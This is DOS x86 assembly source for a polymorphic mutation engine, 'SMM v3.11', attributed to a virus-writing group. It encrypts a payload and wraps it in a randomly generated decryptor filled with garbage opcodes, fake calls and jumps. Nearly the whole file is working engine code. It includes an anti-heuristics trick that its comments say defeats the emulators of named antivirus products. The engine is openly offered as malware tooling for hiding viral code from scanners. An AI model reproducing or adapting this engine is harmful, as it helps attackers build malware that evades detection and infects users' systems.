; SMM Version v.3.11 by Deviator from [HAZARD] Team

; Features:
;  - Higher level of polymorphics.
;  - Creating of calls/jumps
;  - Different encryption type methods (Add/Sub/Xor) with changing key from
;    word to word.
;  - Anti-Heuristics code (if you wish)
;  - Another nice stuff
;  - Optimized alot

; Changes from 3.07
;  - Many bugs fixed
;  - Added forward call routine
;  - Added one variable for reserving register (Resv2)
;  - Different encryption methods (Add/Sub/Xor)
;  - Now Maximum and Minimum garbage numbers stored in variables.
;  - Some constants moved to the start of source (Call number,etc..)

;---------------------------------------------------------------------------
; Input: Ds=Cs=Es
; Ds:Si - Source data to be crypted
; Es:Di - Destination, where to put crypted data with decryptor
; Cx    - Length of data to crypt

; If you want to change decryptor size (and it's speed) change value of
; MaxGarb. MinGarb better leave from 1 to 8.

; Returns:
; Cx    - Decryptor+Source data size
; Es:Di - Filled with crypted data and decryptor
;---------------------------------------------------------------------------

; Principles of SMM work.
; - 1 Step. Choose in which registers do which job. For decryptor needed 
;           three different registers which is Counter,Pointer and Keyword. 
;           Pointer could be Si,Di,Bx. Counter and Keyword cold be any, 
;       except Sp.
; - 2 Step. Creation of decryptor. Decryptor creates byte by byte.
;       Between every byte of decryptor space filled with the garbage.
; - 3 Step. Crypt source data

; Decryptor looks like (when without garbage):

;       call GetOff
;GetOff:    pop Pointer
;       sub Pointer,offset GetOff
;       add Pointer,offset EndOfDecryptor
;       mov Counter,DataLen
;       mov Keyword,Key
;DLoop:     xor/add/sub cs:[Pointer],Keyword
;       dec Counter
;       inc Pointer
;       inc Pointer
;       add Keyword,KeyAdd
;       or Counter,Counter
;       jne NotDcrp
;       jmp EndOfDecryptor
;NotDcrp:   jmp DLoop
;EndOfDecryptor:

; With garbage - between every instruction of decryptor randomed size garbage.

; Where Pointer,Counter,Keyword - different registers and Key,KeyAdd - random
; numbers.

; Yeap, i could throw some code out of decryptor , but wouldn't... ;)

; Decryptors produced by engine is huge(could be) with alot of jumps,calls
; ,etc... So large decryptors works very slowely...

; Bugz: Registers is uncontrolled, so on my i386 when happened opcode
; like mov ax,[Bx+Si] all work well.But when Bx+Si = 0FFFFh system just
; hang-ups... I dont know how to control this...

; If you have any questions - email me at Biodrone2@Hotmail.com

CallN   equ 10          ; Max. procedures number
InCall  equ 3           ; Num. of overlaying procedures
InJmp   equ 2           ; Num. of procedures inside 8bit jmp
InJxn   equ 2           ; Num. of overlaying jumps
FCalln  equ 5           ; Max. forward calls number
NoGarb  equ 0           ; Use this in testing purpose only

;---------------------------------------------------------------------------

smm proc
    push bp             ; Get working offset
    call getff
getff:  pop bp
    sub bp,offset getff

    pusha

    push di cx
    xor ax,ax
    lea di,[CCalls][Bp]     ; Clean data variables
    mov cx,DataL
rep stosb
    pop cx di

    mov ds:[oldsi][bp],si       ; Store values
    mov ds:[olddi][bp],di
    mov ds:[oldcx][bp],cx

    mov ds:[resv][bp],4     ; Mark as non-used
    mov ds:[resv2][bp],4        ; 4 means SP, which is not used
                    ; in decryptor

; Setup Base Decryptor Registers

NoSp:
    mov ax,8                ; Setup Counter Register
    call getrnd
    cmp al,4
    jz NoSp
    mov ds:[counter][bp],al         ; Store counter
;-----------------------------------------------------------------------------
BadPointer:                 ; Setup Pointer Register
    mov ax,3
    call getrnd
    cmp al,0
    jz TryBx
    add al,5
CheckCounter:
    cmp al,ds:[counter][bp]         ; Same to Counter ?
    jz BadPointer               ; Yeap...
    jmp StorePointer
TryBx:
    add al,3
    jmp CheckCounter
StorePointer:
    mov ds:[pointer][bp],al         ; Store pointer
;-----------------------------------------------------------------------------
BadKey:
    mov ax,8                ; Choose keyword
    call getrnd
    cmp al,4
    jz BadKey
    cmp al,ds:[Counter][bp]         ; Check it with counter
    jz BadKey               ; Equal...
    cmp al,ds:[Pointer][bp]         ; Now with pointer
    jz BadKey               ; Equal...
    mov ds:[KeyWord][bp],al         ; Store keyword
;-----------------------------------------------------------------------------

    lea si,[Decryptor][Bp]

    call MGarb              ; Create garbage
                        ; Created garbage doesn't
                        ; uses any registers which
                        ; is reserved.

    movsb                   ; Create call
    mov ds:[Callp][bp],di           ; Store offset for later patch
    stosw                   ; Fill up

    call MGarb              ; Garbage more

    mov ax,di
    mov bx,ds:[Callp][Bp]           ; Patch newly created call
    sub ax,bx
    dec ax
    dec ax
    mov es:[bx],ax

    call MGarb              ; Garble...

    lodsb
    add al,ds:[pointer][bp]         ; Pop pointer
    stosb

    call MGarb              ; Garble

    lodsw                   ; Sub Pointer , offset GetOff
    add ah,ds:[Pointer][Bp]
    stosw                   ; Opcode...

    mov ax,ds:[Callp][Bp]
    sub ax,ds:[OldDi][Bp]           ; Opcode data
    inc ax
    inc ax
    stosw
    
    Call MGarb              ; Garble...

    lodsw                   ; Add Pointer , offset to Data
    add ah,ds:[Pointer][Bp]
    stosw
    mov ds:[Callp][Bp],di
    stosw

;---------------- Anti Heuristics Trick -------------------

; Simple anti-heuristics trick.
; In all dos which versions higher than 3.00 returns in Ax 00FFh when
; called function 1200h of int 2Fh.
; Code of trick:

; mov ax,1200h
; int 2Fh
; sub ax,0FFh
; add pointer,ax

; In emulation (DrWeb,F-Prot) after int call in ax would be 0. Sub it by 0FFh
; We would get something like -0FFh (large number). When we add this to 
; pointer, it would point who knows where...

    cmp ds:[AntiH1][Bp],0
    jz NoTrick1

    Call MGarb

    mov ds:[Resv][Bp],0     ; Reserve Ax (garbage wouldn't
                    ; trash it)

    push si
    lea si,[AntiH1C][Bp]
    
    movsw
    movsb

    call MGarb

    movsw

    call MGarb

    movsw

    Call MGarb

    movsb
    movsw

    Call MGarb

    movsb

    mov al,ds:[Pointer][Bp]
    shl al,3
    add al,0C0h
    stosb

    mov ds:[Resv][Bp],4     ; Free up register
    pop si
NoTrick1:
;----------------------------------------------------------
    Call MGarb
    
    lodsb
    add al,ds:[Counter][Bp]         ; Move to Counter Number
    stosb
    mov ax,ds:[OldCx][bp]
    shr ax,1
    inc ax
    stosw

    Call MGarb

    call getrnd
    mov ds:[BegCr][bp],ax           ; Move to KeyWord base key
    push ax
    lodsb
    add al,ds:[KeyWord][Bp]
    stosb
    pop ax
    stosw

    Call MGarb

; Here Begins Creation Of Decryption Loop

    mov ds:[LoopSt][Bp],di
    
    Call MGarb

    movsb

    push si
    mov ax,3
    call getrnd
    lea si,[Ctbl][Bp]
    shl ax,1
    add si,ax
    movsb
    lodsb
    mov ds:[PatchIt][Bp],al

    mov al,ds:[Pointer][Bp]         ; Patch for Pointer
    cmp al,3
    jz ItsBx
    sub al,2
    jmp DonePatch       
ItsBx:
    mov al,7
DonePatch:
    mov cl,ds:[KeyWord][Bp]
    shl cl,3
    add al,cl
    stosb
    pop si

    Call MGarb

    lodsb
    add al,ds:[Counter][Bp]         ; Dec Counter
    stosb
    
    Call MGarb

    lodsb
    add al,ds:[Pointer][Bp]         ; Inc Pointer
    stosb

    Call MGarb

    lodsb
    add al,ds:[Pointer][Bp]         ; Inc Pointer
    stosb

    Call MGarb

    lodsw
    add ah,ds:[KeyWord][Bp]         ; Add KeyWord,AddNum
    stosw
    call GetMax
    mov ds:[AddCr][Bp],ax
    stosw

    Call MGarb

    movsb                   ; Or Counter,Counter
    mov al,ds:[Counter][Bp]
    shl al,3
    add al,0C0h
    add al,ds:[Counter][Bp]
    stosb

    push si
    mov ax,ds:[MinGarb][Bp]         ; Fill with anti-flags
    call getrnd             ; trashing code.
    inc ax
    xchg ax,cx
MakeItq:
    push cx
    call FFriendly
    pop cx
    loop MakeItq
    pop si

    Inc ds:[JCnt][Bp]

    movsb                   ; Jne xx
    mov ds:[JnePat][Bp],di
    stosb

    call MGarb

    movsb                   ; Jmp AllDone
    mov ds:[EndPt][Bp],di
    stosw

    Call MGarb

    Dec ds:[JCnt][Bp]

    mov ax,di
    mov bx,ds:[JnePat][Bp]          ; Patch Jne
    sub ax,bx
    dec ax
    mov es:[bx],al

    Call MGarb

    movsb                   ; Jmp Loop
    mov ax,ds:[LoopSt][Bp]
    sub ax,di
    dec ax
    dec ax
    stosw

    Call MGarb

    mov ax,di               ; Patch for End of decryptor
    mov bx,ds:[EndPt][Bp]
    sub ax,bx
    dec ax
    dec ax
    mov es:[bx],ax

    mov ax,di               ; Patch for End of decryptor
    mov bx,ds:[CallP][Bp]
    sub ax,ds:[OldDi][Bp]
    mov es:[bx],ax

    mov cx,ds:[oldcx][Bp]           ; Crypt Source
    shr cx,1
    inc cx
    mov si,ds:[oldsi][bp]

    mov bx,ds:[BegCr][Bp]
CryptIt:
    lodsw
Patchit db  ?
    db  0C3h
    stosw
    add bx,ds:[AddCr][Bp]
    loop CryptIt

    Call FinishJob

;---------------------------------------------------------------------
    mov cx,di
    sub cx,ds:[olddi][bp]           ; Calculate new size
    mov ds:[oldcx][bp],cx
    popa
    mov cx,ds:[oldcx][bp]
    pop bp
    ret
smm endp
;---------------------------------------------------------------------
GetReg16    proc
    Call GetMax
    push ax
    and al,00111000b
    shr al,3
    cmp al,Ds:[Pointer][Bp]
    jz BadReg
    cmp al,ds:[Counter][BP]
    jz BadReg
    cmp al,ds:[Keyword][Bp]
    jz BadReg
    cmp al,ds:[Resv][Bp]
    jz BadReg
    cmp al,ds:[Resv2][Bp]
    jz BadReg
    cmp al,4
    jz BadReg
    pop ax
    ret
BadReg: pop ax
    jmp GetReg16
GetReg16    endp

GetSize proc
    xor cx,cx

    cmp al,40h
    ja NoCheckIt

    push ax
    and al,10000111b
    cmp al,6
    pop  ax
    jz Byte2

NoCheckIt:
    cmp al,40h
    jb Byte0
    cmp al,80h
    jb Byte1
    cmp al,0C0h
    jae Byte0
Byte2:  inc cx
Byte1:  inc cx
Byte0:  ret
GetSize endp

GetReg8 proc
    Call GetMax
    push ax
    and al,00111000b
    shr al,3
    cmp al,4
    jb NoSub3
    sub al,4
NoSub3: cmp al,ds:[Counter][BP]
    jz BadReg8
    cmp al,ds:[Pointer][Bp]
    jz BadReg8
    cmp al,ds:[KeyWord][Bp]
    jz BadReg8
    cmp al,ds:[Resv][Bp]
    jz BadReg8
        cmp al,ds:[Resv2][Bp]
    jz BadReg8

    pop ax
    ret
BadReg8:
    pop ax
    jmp GetReg8
GetReg8 endp


;---------------------------------------------------------------------
MGarb   proc
    cmp ds:[JCnt][bp],0         ; Make garbage
    jne Minimum             ; If there any 8bit jumps ?
    mov ax,ds:[MaxGarb][Bp]         ; No - give maximum garbage
    jmp MakeGrb
Minimum:
    mov ax,ds:[MinGarb][Bp]         ; Else - give minimum garbage
MakeGrb:
    call getrnd             ; Get rnd from 0 to GarbSize
    inc ax                  ; Increase to skip zero
    xchg ax,cx              ; Cx = Ax
CreateIt:
    push cx
    call GG                 ; Make opcode
    pop cx
    loop CreateIt               ; Next one
    ret
MGarb   endp
;---------------------------------------------------------------------
MTable:                     ; Main table
    dw  offset TwoThreeFour16       ; 16bit diff. size opcodes
    dw  offset Imm16            ; Immediatly 16bit regs moves
    dw  offset AxZero           ; Inc/Dec 16 bit regs
    dw  offset AxXchg           ; Xchg Ax,Reg
    dw  offset AxImm16          ; Ax reg opcodes generation
    dw  offset jxx          ; Case jumps creation
    dw  offset MakeCall         ; Procedure creation
    dw  offset PFCall           ; Patch forward call

    dw  offset MakeInt          ; Int encode
    dw  offset TwoThreeFour8        ; 8Bit diff. size opcodes
    dw  offset PutCall          ; Put call to procedures
    dw  offset Imm8         ; Immediatly 8bit opcodes
    dw  offset OneByters        ; One-Byters
    dw  offset FCall            ; Create forward call
    dw  offset MakeRol          ; Shl/Shr/Sar/Rol/etc..
    dw  offset MakeIn           ; In Al,Port8
TEntries    equ 16
;---------------------------------------------------------------------

Oldz    dw  ?

GG  proc
    push si

GGz:
If  NoGarb
    ret
EndIf
    mov ax,TEntries             ; Any reserved register used ?
    cmp ds:[ResV][Bp],4         ; If yes, dont use 8 bit
    jne Subitq              ; codes and call creation.
    cmp ds:[ResV2][Bp],4
    jz NoSubq

; Skip 8 bit - couse could be reserved Ax+Bx+Cx+Dx and it would produce
; forever loop.
; Skip call creation - we could use some reserved register. 
; But it was probably used in previous procedure, so after call it would be 
; trashed.

Subitq: sub ax,6
NoSubq: 
    call getrnd             ; Get Rnd
    cmp ds:[Oldz][Bp],ax            ; Previous was same ?
    jz GGz                  ; Again plz...
MakeIt4:
    mov ds:[Oldz][Bp],ax            ; Store current

    shl ax,1
    lea si,ds:[MTable][bp]
    add si,ax
    mov ax,[si]             ; Get procedure offset
    add ax,bp
    call ax                 ; Call Procedure
    pop si
    ret
GG  endp
;---------------------------------------------------------------------
FTable  dw  offset Imm16            ; Another table
    dw  offset AxXchg
    dw  offset MakeCall
    dw  offset PFCall

    dw  offset Imm8
FEntries    equ 5

FFriendly   proc            ; Creating of anti-flag-trashing
If  NoGarb              ; opcodes.
    ret
EndIf
    mov ax,FEntries
    cmp ds:[Resv][Bp],4
    jne SubIt2
    cmp ds:[Resv2][Bp],4
    jz NoSub2
SubIt2: sub ax,1
NoSub2: call getrnd
    shl ax,1
    lea si,ds:[FTable][Bp]      ; Get offset
    add si,ax
    mov ax,ds:[Si]
    add ax,bp           ; Call procedure
    call ax
    ret
FFriendly   endp
;---------------------------------------------------------------------
OneByters:              ; One byters creation
    mov ax,OneByteL
    call getrnd
    xchg ax,si
    lea si,ds:[OneByte][bp][Si] ; Get it from table
    movsb
    ret
OneByte db  02Eh,03Eh,0F8h,0F9h,0FBh,0FCh,0FDh,026h,36h
OneByteL    equ $ - OneByte
;---------------------------------------------------------------------
TwoThreeFour16:             ; Diff. size opcodes encoding

    call GetReg16           ; Choose second byte
    push ax

        Call CheckBp

    mov ax,NormOpL
    call getrnd
    xchg ax,si
    lea si,ds:[NormOp][bp][Si]
    movsb               ; Get first byte

        pop ax

    stosb
    Call GetSize

    or cx,cx            ; If there any additional bytes ?
    jz ReturnIt         ; Nope ...
FillUp:
    call GetMax         ; Create it...
    stosb
    loop FillUp
ReturnIt:
    ret

NormOp  db  03h,13h,23h,33h,0Bh,1Bh,2Bh,3Bh
NormOpl equ $ - NormOp
;---------------------------------------------------------------------
TwoThreeFour8:
    call GetReg8
    push ax

    Call CheckBp

    mov ax,NormOp8L         ; Same that TwoThreeFour16
    call getrnd         ; but for 8bit regs
    xchg ax,si
    lea si,ds:[NormOp8][bp][Si]
    movsb

    pop ax
    stosb
    Call GetSize

    or cx,cx
    jz ReturnIt8
FillUp8:
    call GetMax
    stosb
    loop FillUp8
ReturnIt8:
    ret

NormOp8 db  02h,12h,22h,32h,0Ah,1Ah,2Ah,3Ah
NormOp8l equ    $ - NormOp8
;---------------------------------------------------------------------
iMM16:
    call ChooseReg          ; Choose register
    add al,0B8h         ; Add "mov ax,xxxx"
    stosb               ; and we would get "add reg,xxxx"
    call GetMax
    stosw               ; Random data
    ret
;---------------------------------------------------------------------
iMM8:
    mov ax,8            ; Immediatly 8..

    call getrnd         ; Get reg
    mov bx,ax

    cmp al,4            ; More then Bx ?
    jb NoSub
    sub al,4            ; Make it smaller (Ah=Al,Ch=Cl,etc)
NoSub:
    Call CReg           ; Check if reg is used
    jz iMM8

    add al,0B0h         ; Nope...
    stosb               ; Encode Mov reg8,xx

    call GetMax
    stosb

    ret

;---------------------------------------------------------------------
AxZero:
    call ChooseReg          ; Get reg
    push ax
    mov ax,2
    call getrnd
    shl ax,3
    pop cx
    add ax,cx
    add al,40h          ; Encode Inc/Dec Reg
    stosb
    ret
;---------------------------------------------------------------------
AxXchg: xor ax,ax
    Call CReg
    jz BadSituation
        call ChooseReg          ; Encode xchg ax,reg
    add al,90h
    stosb
BadSituation:
    ret
;---------------------------------------------------------------------
ChooseReg   proc
    mov ax,8
    Call getrnd         ; Get random register
    Call CReg
    jz ChooseReg
    ret             ; Return it in al
ChooseReg   endp
;---------------------------------------------------------------------

AxImm16:                ; Add,Sub,etc... with ax
    xor ax,ax
    Call CReg
    jz AxUsed
ChooseReg2:
    mov ax,AxTl
    call getrnd
    xchg ax,si
    lea si,ds:[AxT][bp][Si]
    movsb
    call GetMax
    stosw
AxUsed:
    ret

AxT db  05h,15h,25h,35h,0Dh,1Dh,2Dh,3Dh,0A9h,0A1h
AxTl    equ $ - AxT
;---------------------------------------------------------------------
jxx:                        ; Forward case jumps
    inc ds:[JCnt][Bp]           ; Increase jumps number

    cmp ds:[Jcnt][Bp],InJxN         ; If it reached maximum
    ja RestoreJx                ; at one time ?

    mov ax,16               ; Get one of 16 diff. jxx
    call getrnd
    add al,70h              ; Encode it
    stosb
    push di                 ; Store for later patch
    stosb

    call MGarb              ; Create garbage

    mov ax,di
    pop si
    sub ax,si
    dec al
    mov es:[si],al
RestoreJx:
    dec  ds:[Jcnt][bp]
    ret

;---------------------------------------------------------------------
MakeCall:
    mov ax,ds:[cnum][bp]            ; Get current call numbers
    cmp ax,InCall               ; creating at one time
    jae CallsGone               ; More then InCall ?

    cmp ds:[CallsNum][Bp],CallN ; More then table space aviable ?
    jae CallsGone

    cmp ds:[JCnt],InJmp         ; Are we inside Jxx proc ?
    jae CallSGone           ; If yes , could we create proc ?

    inc ds:[cnum][bp]           ; All ok... Increase proc num

    mov al,0E9h             ; Encode Jmp near
    stosb
    push di                 ; Store for later patch
    stosw

    call GG                 ; Create one logical opcode

    push di                 ; Store offset of procedure

    call MGarb              ; Garble it

    mov al,0C3h             ; Encode retn
    stosb

    call GG                 ; Another opcode

    mov ax,ds:[CallsNum][Bp]        ; Store offset of proc
    shl ax,1                ; in table
    lea si,ds:[CCalls][Bp]
    add si,ax
        pop ax
    mov cs:[si],ax

    mov ax,di               ; Patch call procedure
        pop si
    sub ax,si
    dec ax
    dec ax
    mov es:[si],ax

    dec  ds:[Cnum][bp]
    inc  ds:[CallsNum][Bp]

CallsGone:
    ret
;---------------------------------------------------------------------
PutCall:                    ; Put call to procedure
    mov ax,ds:[CallsNum][bp]
    or ax,ax
    jz CallsGone                ;( No procedures created !

    call GetRnd             ; Get random procedure

    shl ax,1
    lea si,ds:[CCalls][bp]
    add si,ax

    mov al,0E8h             ; Encode Call
    stosb

    lodsw

    sub ax,di               ; Patch offset
    dec ax
    dec ax
    stosw

    ret
;---------------------------------------------------------------------
MakeInt:                    ; Make Int
    cmp ds:[UseInt][Bp],0
    jz NoInts
    xor ax,ax
    Call Creg               ; Ax used ?
    jz NoInts

    mov ax,iTbls
    call getrnd             ; Get random int func. from
    shl ax,1
    xchg ax,si
    lea si,[iTbl][Bp][Si]           ; table
    mov al,0B4h             ; encode mov ah,FuncNum
    stosb
    movsb
    mov al,0CDh             ; encode int FuncInt
    stosb
    movsb
NoInts:
    ret
iTbl    db  0Bh,21h             ; Function,Int
    db  19h,21h
    db  4Dh,21h
    db  54h,21h
    db  14h,12h
iTbls   equ ($-iTbl)/2
;---------------------------------------------------------------------
FCall:  cmp ds:[CNum][Bp],0         ; Create forward call
    jne NoMake              ; We're inside procedure ?

    mov ax,ds:[FCallp][Bp]          ; Get number of forward
    cmp ax,FCalln               ; call offsets
    jae NoMake          ; More then aviable table space ?

    cmp ds:[FCallpt][Bp],0          ; We're creating another
    jne NoMake              ; forward procedure ?

    shl ax,1
    lea si,[FCallT][Bp]         ; Nope... Lets point to
    add si,ax               ; free part of table

    mov al,0E8h             ; Encode Call 
    stosb
    mov ds:[si],di              ; Store offset for later
    stosw                   ; pach

    inc ds:[FCallp][Bp]     ; Increase number of fwrd .calls

NoMake: ret
;---------------------------------------------------------------------
PFCall:                     ; Patch forward call
    mov ax,ds:[FCallp][Bp]          ; If there any waiting
    or ax,ax                ; to be patched ?
    jz NoMake2

    cmp ds:[FCallpt][Bp],0          ; We're patching now ?
    jne NoMake2

    inc ds:[FCallpt][Bp]            ; Lets patch

    mov al,0E9h             ; Encode Jmp near
    stosb
    push di
    stosw

    call GG                 ; One byte garble

    push di

    call MGarb              ; Make garbage

    mov al,0C3h             ; Encode ret
    stosb

    call GG                 ; Garble

    mov ax,ds:[FCallP][Bp]
    dec ax
    shl ax,1
    lea si,ds:[FCallT][Bp]
    add si,ax
    lodsw
    mov si,ax               ; Patch Call
        pop bx
        sub ax,bx
    inc ax
    inc ax
    neg ax
    mov es:[si],ax

    mov ax,di               ; Patch jmp
    pop si
    sub ax,si
    dec ax
    dec ax
    mov es:[si],ax

    dec ds:[FCallp][Bp]
    dec ds:[FCallpt][Bp]
NoMake2:
    ret
;---------------------------------------------------------------------
MakeRol:mov ax,8
    Call GetRnd
    cmp al,6
    jz MakeRol
    push ax
    Call ChooseReg
    push ax
    mov al,0D1h
    stosb
    pop  ax
    pop  bx
    shl  bl,3
    add  bl,0C0h
    add  al,bl
    stosb
    ret
;---------------------------------------------------------------------
MakeIn: xor ax,ax
    Call CReg
    jz SkipIn
    push si
    Mov ax,InTblL
    Call GetRnd
    xchg ax,si
    lea si,[Si][Bp][InTbl]
    mov al,0E4h
    stosb
    movsb
    pop  si
SkipIn: ret

InTbl   db  21h         ; Interrupt controller
    db  40h         ; Timer 1
    db  41h         ; Timer 2
    db  00h         ; DMA 0
    db  01h         ; DMA 0
    db  02h         ; DMA 1
    db  03h         ; DMA 1
    db  04h         ; DMA 2
    db  05h         ; DMA 2
    db  06h         ; DMA 3
    db  07h         ; DMA 3
    db  60h         ; Get char
InTbll  equ $ - InTbl
;---------------------------------------------------------------------
;---------------------------------------------------------------------
;---------------------------------------------------------------------
FinishJob   proc                ; Check if there any
    mov cx,ds:[FCallP][Bp]          ; unfinished forward
    or cx,cx                ; calls ?
    jz NoFinish
LMakez: push cx
    call PFCall
    pop  cx
    loop LMakez
NoFinish:
    ret
FinishJob   endp
;---------------------------------------------------------------------
CReg    proc
    cmp ds:[Counter][bp],al     ; Reg used ?
    jz CregDone
    cmp ds:[Pointer][Bp],al
    jz CregDone
    cmp ds:[KeyWord][bp],al
    jz CregDone
    cmp ds:[ResV][Bp],al
    jz CregDone
    cmp ds:[ResV2][Bp],al
    jz CregDone
    cmp al,4
CRegDone:
        ret
Creg    endp
;---------------------------------------------------------------------
CheckBp proc
    mov cx,24
    mov ah,2
CheckBp1:
    cmp al,ah
    jz MakePr
    add ah,8
    loop CheckBp1

    mov cx,24
    mov ah,3
CheckBp2:
    cmp al,ah
    jz MakePr
    add ah,8
    loop CheckBp2

    mov cx,(0C0h-40h)/8
    mov ah,46h
CheckBp3:
    cmp al,ah
    jz MakePr
    add ah,8
    loop CheckBp3

    jmp NoPrefix

MakePr: mov ax,2
    Call Getrnd
    dec ax
    jz MakeEs
    mov al,3Eh
    stosb
    ret
MakeEs: mov al,26h
    stosb
    ret
NoPrefix:
    ret
CheckBp endp
;---------------------------------------------------------------------
RandSeed    dd   0      ; For random number generator

Randomize   proc    near
    pusha
    push es

    push 040h
    pop es
    mov ax,es:[6Ch]         ; Get from timer current time
    mov bx,es:[6Ch]
    xor bx,ax
    neg bx
                    ; Store time
    mov word ptr cs:[RandSeed][bp],ax
    mov word ptr cs:[RandSeed][bp][2],bx
    pop es
    popa
    ret
Randomize   endp

getrnd      proc            ; Get's random value
        push dx
        push di si cx bx    ; Save used registers
        mov  cx,ax      ; save limit
        mov  ax,Word ptr cs:[RandSeed+2][bp]
        mov  bx,Word ptr cs:[RandSeed][bp]
        mov  si,ax      ; Lets make some manipulations
        mov  di,bx      ; with old random value
        mov  dl,ah
        mov  ah,al      ; Exchange it
        mov  al,bh
        mov  bh,bl
        xor  bl,bl
        rcr  dl,1       ; Rotate it
        rcr  ax,1
        rcr  bx,1
        add  bx,di
        adc  ax,si
        add  bx,62e9h   ; Add it
        adc  ax,3619h
                    ; Store new value
        mov  word ptr cs:[RandSeed][bp],bx
        mov  word ptr cs:[RandSeed+2][bp],ax
        xor  dx,dx      ; If we divide by maximum needed
                    ; value , in Dx we would get
                    ; number which in area of 0 <-> Limit
        or cx,cx
        jnz YeapLimit
        mov dx,ax
        jmp NoLimit
YeapLimit:
        div  cx
NoLimit:
        pop  bx cx si di
        mov  ax,dx      ; return modulus
        pop dx
        ret
getrnd      EndP
;---------------------------------------------------------------------
CTbl    db  31h
    db  33h
    
    db  01h
    db  2Bh

    db  29h
    db  03h
;---------------------------------------------------------------------
GetMax  proc
    xor ax,ax
    Call GetRnd
    ret
GetMax  endp

Decryptor:
    db  0E8h        ; Call
    db  58h     ; Pop Pointer
    db  81h,0E8h    ; Sub pointer
    db  81h,0C0h    ; Add pointer
    db  0B8h        ; Mov Counter
    db  0B8h        ; Mov Keyword
    db  2Eh     ; Xor/Add/Sub...
    db  48h     ; Dec counter
    db  40h     ; Inc Pointer
    db  40h     ; Inc Pointer
    db  81h,0C0h    ; Add Keyword
    db  0Bh     ; Or Counter,Counter
    db  75h     ; Jne
    db  0E9h        ; Jmp
    db  0E9h        ; Jmp

AntiH1C db  0B8h,00,12h ; Mov Ax,1200h
    db  0CDh,2Fh    ; Int 2Fh
    db  0B4h,00h    ; Mov Dh,0
    db  2Dh,0FFh,0  ; Sub Dx,0FFh
    db  03      ; Add Pointer,Ax
